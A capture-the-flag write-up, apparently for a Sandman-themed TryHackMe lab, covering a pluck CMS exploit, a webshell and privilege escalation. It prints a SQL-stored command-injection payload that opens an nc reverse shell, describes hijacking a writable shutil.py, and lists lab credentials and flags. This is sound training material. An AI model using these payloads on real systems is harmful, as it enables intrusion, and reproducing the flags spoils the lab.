
----------

## Description

While the king of dreams was imprisoned, his home fell into ruins.  

Can you help Sandman restore his kingdom?

-------

Visiting the website (assuming there's one), I get this.

A **simple Apache2 server**.
![[Pasted image 20251130171508.png]]

Nothing special in the source code either.

Since I didn't find anything useful, I **decided to run a nmap and gobuster scan**.

------

## Nmap

![[Pasted image 20251130172837.png]]

On the nmap scan, I found two services.
1. SSH (not vulnerable)
2. HTTP (just the Apache2 server)

Let's move to gobuster.

---

## Gobuster 

On the gobuster scan, I found an interesting directory -> `app`.
![[Pasted image 20251130171829.png]]

Visiting the endpoint, I **found a pluck application**.

![[Pasted image 20251130172025.png]]

Inside the app I found this.
![[Pasted image 20251130172138.png]]

Fortunately, I found an **exploit for this CMS app**.
Let's use it.
![[Pasted image 20251130172621.png]]

--------

## Exploit

We have a problem: the exploit only works if we are authenticated.

I tried to find any default password for pluck but with no success.

I tried some easy passwords like "admin" and "pluck", but when I tried "password" it worked.
![[Pasted image 20251130175544.png]]

Now that we are logged in, we can use the exploit.
![[Pasted image 20251130175549.png]]

Nice, we have a webshell.
![[Pasted image 20251130175617.png]]

-----------

## Priv Escalation

Looking around the shell, I found some users.
![[Pasted image 20251130175710.png]]

I looked into all the users, but the only one that had something useful was `morpheus`.

Morpheus has a restore.py that makes a backup to `/home/morpheus/kingdom`.
![[Pasted image 20251130181518.png]]

First I decided to upgrade my shell, because I wasn't getting all output on the webshell.
![[Pasted image 20251130182444.png]]![[Pasted image 20251130182449.png]]

After that I decided to run linpeas.sh to try to find anything useful.

I might be blind but I didn't find anything useful.

After a while I found these two files in /opt.
![[Pasted image 20251130185435.png]]

Using cat on test.py we get the credentials for lucien.
![[Pasted image 20251130185525.png]]
Ok, now we are lucien.

> lucien:HeyLucien#@1999!

## LUCIEN FLAG
```lucien flag
THM{TH3_L1BR4R14N}
```

Running `sudo -l` shows us that we can run getDreams.py without a password.
![[Pasted image 20251130185855.png]]

I then remembered that getDreams.py was also in /opt, let's find what's inside.
![[Pasted image 20251130190031.png]]

Basically, the script connects to the MySQL database, reads all rows from the `dreams` table, and retrieves each dreamer and their dream.  
Then it prints them by running an `echo` shell command for every row.

If we can put our malicious dream inside the table, when running `sudo` as `death`, getDreams.py will give us a shell.

For this I had to look for lucien's database password. I found it in .bash_history.
![[Pasted image 20251130191308.png]]

> lucien:lucien42DBPASSWORD

![[Pasted image 20251130191643.png]]
After putting the payload `| ls` I managed to get code to run. Let's now spawn a shell.

I used this payload:
```payload
mysql> INSERT INTO dreams (dreamer, dream) VALUES ('ez', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.133.89.2.12 4242 >/tmp/f)');
```

![[Pasted image 20251130193529.png]]
Let's get the flag.

![[Pasted image 20251130193712.png]]

## DEATH FLAG
```death flag
THM{1M_TH3R3_4_TH3M}
```

Using cat on the real getDreams.py, we get death's credentials.
![[Pasted image 20251130193932.png]]

> death:!mementoMORI666!

Using `sudo -l` shows us that we don't have any sudo permissions.
![[Pasted image 20251130194037.png]]

We see that the script uses shutil. I tried to see if we could write to it.
![[Pasted image 20251130194511.png]]

![[Pasted image 20251130194636.png]]I'm not sure why, but apparently we can write to shutil.py.

First I decided to run pspy64 to see if the user morpheus was running the script (otherwise we can't get his shell).

Apparently morpheus is running this script. So we can put our malicious code and get a shell.
![[Pasted image 20251130194801.png]]
![[Pasted image 20251130195018.png]]
![[Pasted image 20251130195011.png]]

After a while I got the shell.

## MORPHEUS FLAG
```morpheus flag
THM{DR34MS_5H4P3_TH3_W0RLD}
```

----
